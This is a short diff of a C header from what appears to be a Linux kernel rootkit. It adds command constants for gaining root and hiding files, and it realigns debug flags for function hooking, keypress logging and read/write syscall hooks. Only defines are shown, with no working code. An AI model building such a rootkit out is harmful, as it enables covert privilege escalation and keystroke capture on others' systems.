@@ -13,11 +13,14 @@
 #       include <linux/autoconf.h>
 #   endif
 
+#   define CMD_ROOT         0
+#   define CMD_HIDE_FILE    1
+
 // Debugging definitions
-#   define __DEBUG__ 1      // General debugging statements
-#   define __DEBUG_HOOK__ 1 // Debugging of inline function hooking
-#   define __DEBUG_KEY__ 1  // Debugging of user keypresses
-#   define __DEBUG_RW__ 1   // Debugging of sys_read and sys_write hooks
+#   define __DEBUG__        1   // General debugging statements
+#   define __DEBUG_HOOK__   1   // Debugging of inline function hooking
+#   define __DEBUG_KEY__    1   // Debugging of user keypresses
+#   define __DEBUG_RW__     1   // Debugging of sys_read and sys_write hooks
 
 // Debugging definitions
 #   if __DEBUG__
